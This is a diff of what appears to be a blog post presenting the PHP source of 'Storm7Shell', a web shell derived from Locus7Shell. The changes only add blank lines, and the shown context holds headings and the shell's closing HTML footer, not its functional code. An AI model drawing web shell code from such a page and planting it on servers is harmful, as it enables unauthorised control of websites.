@@ -16,6 +16,7 @@ This Storm7Shell is a modified Locus7Shell.
 
 By sToRm, a 15 year old hacker (apparently).
 
+
 ### Storm7Shell Script Source Code
 
 {% highlight php %}<?php
@@ -8361,6 +8362,7 @@ if(isset($_GET['directory'])) {
 &lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;--[ Storm7Shell v<?php echo $shver; ?>, coded by sToRm&lt;/font&gt;&lt;/a&gt;&lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--&lt;/b&gt;&lt;br&gt;Who said that it's better to have loved and lost?&lt;br&gt;I wish that I had never loved at all.&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;<?php chdir($lastdir); c99shexit(); ?>
 {% endhighlight %}
+
 
 ### Storm7Shell script screenshot<figure id="attachment_406" style="width: 604px;" class="wp-caption aligncenter">
 
